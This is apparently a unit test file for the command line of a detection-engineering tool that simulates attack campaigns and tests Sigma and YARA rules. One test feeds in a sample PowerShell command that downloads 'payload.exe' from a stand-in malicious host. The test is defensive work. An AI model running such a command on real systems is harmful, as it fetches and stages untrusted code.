"""Unit tests for tools.swarm.cli argument parsing and command dispatch."""

from __future__ import annotations

import io
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from tools.swarm import cli


class SwarmCliParserTests(unittest.TestCase):
    """Verifies CLI flag parsing and default option configurations."""

    def test_default_args(self):
        with patch.object(sys, "argv", ["tools.swarm.cli"]):
            args = cli.parse_args()
            self.assertEqual(args.target, "sigma")
            self.assertEqual(args.max_cycles, 3)
            self.assertEqual(args.variants_per_cycle, 6)
            self.assertEqual(args.iterations, 10)
            self.assertEqual(args.events, 2500)
            self.assertEqual(args.attack_variants, 14)
            self.assertFalse(args.autonomous)
            self.assertFalse(args.benchmark_snr)
            self.assertFalse(args.profile_siem)
            self.assertFalse(args.export_d3fend)
            self.assertFalse(args.validate_gate)
            self.assertFalse(args.export_layer)
            self.assertFalse(args.graph)
            self.assertFalse(args.synthesize_trends)

    def test_custom_flags(self):
        with patch.object(
            sys,
            "argv",
            [
                "tools.swarm.cli",
                "--target",
                "yara",
                "--max-cycles",
                "5",
                "--variants-per-cycle",
                "8",
                "--autonomous",
                "--iterations",
                "20",
                "--benchmark-snr",
                "--events",
                "500",
                "--attack-variants",
                "10",
                "--profile-siem",
                "--export-d3fend",
                "--validate-gate",
                "--export-layer",
                "--graph",
                "--synthesize-trends",
                "--self-heal",
                "--campaign",
                "infostealer",
                "--prompt",
                "Test prompt directive",
            ],
        ):
            args = cli.parse_args()
            self.assertEqual(args.target, "yara")
            self.assertEqual(args.max_cycles, 5)
            self.assertEqual(args.variants_per_cycle, 8)
            self.assertTrue(args.autonomous)
            self.assertEqual(args.iterations, 20)
            self.assertTrue(args.benchmark_snr)
            self.assertEqual(args.events, 500)
            self.assertEqual(args.attack_variants, 10)
            self.assertTrue(args.profile_siem)
            self.assertTrue(args.export_d3fend)
            self.assertTrue(args.validate_gate)
            self.assertTrue(args.export_layer)
            self.assertTrue(args.graph)
            self.assertTrue(args.synthesize_trends)
            self.assertTrue(args.self_heal)
            self.assertEqual(args.campaign, "infostealer")
            self.assertEqual(args.prompt, "Test prompt directive")


class SwarmCliDispatchTests(unittest.TestCase):
    """Executes main() entry points across CLI actions."""

    def test_main_validate_gate(self):
        with patch.object(sys, "argv", ["tools.swarm.cli", "--validate-gate"]):
            with patch("sys.stdout", new=io.StringIO()):
                ret = cli.main()
                self.assertEqual(ret, 0)

    def test_main_export_d3fend(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            with patch.object(
                sys, "argv", ["tools.swarm.cli", "--export-d3fend", "--output-dir", str(tmp_path)]
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)
                    self.assertTrue((tmp_path / "d3fend_layer.json").exists())

    def test_main_export_layer(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            with patch.object(
                sys, "argv", ["tools.swarm.cli", "--export-layer", "--output-dir", str(tmp_path)]
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)
                    self.assertTrue((tmp_path / "layer.json").exists())

    def test_main_profile_siem(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            with patch.object(
                sys, "argv", ["tools.swarm.cli", "--profile-siem", "--output-dir", str(tmp_path)]
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)
                    self.assertTrue((tmp_path / "siem_profile.json").exists())

    def test_main_benchmark_snr_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            with patch.object(
                sys,
                "argv",
                [
                    "tools.swarm.cli",
                    "--benchmark-snr",
                    "--events",
                    "20",
                    "--attack-variants",
                    "2",
                    "--output-dir",
                    str(tmp_path),
                ],
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)
                    self.assertTrue((tmp_path / "noise_floor.json").exists())

    def test_main_graph_fast(self):
        with patch.object(sys, "argv", ["tools.swarm.cli", "--graph", "--iterations", "2"]):
            with patch("sys.stdout", new=io.StringIO()):
                ret = cli.main()
                self.assertEqual(ret, 0)

    def test_main_synthesize_trends(self):
        with patch(
            "tools.swarm.synthesizer.StrategicSynthesizer.synthesize",
            return_value=(
                Path("test_cable.md"),
                {
                    "cable_id": "CABLE-TEST",
                    "cables_ingested": 1,
                    "total_evaluations": 10,
                    "resilience_rate": 0.8,
                    "gaps_discovered": 2,
                    "containment_rate": 1.0,
                    "average_depth_of_defense": 0.9,
                    "cluster_counts": {"Initial Access": 1},
                },
            ),
        ):
            with patch.object(sys, "argv", ["tools.swarm.cli", "--synthesize-trends"]):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)

    def test_main_prompt_sigma(self):
        with patch.object(
            sys,
            "argv",
            [
                "tools.swarm.cli",
                "--prompt",
                "Invoke-WebRequest -Uri 'http://malicious.example.com' -OutFile C:\\temp\\payload.exe",
                "--target",
                "sigma",
            ],
        ):
            with patch("sys.stdout", new=io.StringIO()):
                ret = cli.main()
                self.assertEqual(ret, 0)

    def test_main_campaign_single(self):
        with patch("tools.swarm.cable_writer.CableWriter.write_campaign_cable", return_value=Path("mock.md")):
            with patch.object(
                sys,
                "argv",
                [
                    "tools.swarm.cli",
                    "--campaign",
                    "infostealer",
                ],
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)

    def test_main_campaign_autonomous_fast(self):
        with patch("tools.swarm.cable_writer.CableWriter.write_campaign_cable", return_value=Path("mock.md")):
            with patch.object(
                sys,
                "argv",
                [
                    "tools.swarm.cli",
                    "--campaign",
                    "ransomware",
                    "--autonomous",
                    "--iterations",
                    "1",
                ],
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)
    def test_main_autonomous_sparring_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            with patch.object(
                sys,
                "argv",
                [
                    "tools.swarm.cli",
                    "--autonomous",
                    "--iterations",
                    "1",
                    "--output-dir",
                    tmp,
                ],
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)

    def test_main_closed_loop_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            with patch.object(
                sys,
                "argv",
                [
                    "tools.swarm.cli",
                    "--max-cycles",
                    "1",
                    "--variants-per-cycle",
                    "1",
                    "--output-dir",
                    tmp,
                ],
            ):
                with patch("sys.stdout", new=io.StringIO()):
                    ret = cli.main()
                    self.assertEqual(ret, 0)


if __name__ == "__main__":
    unittest.main()
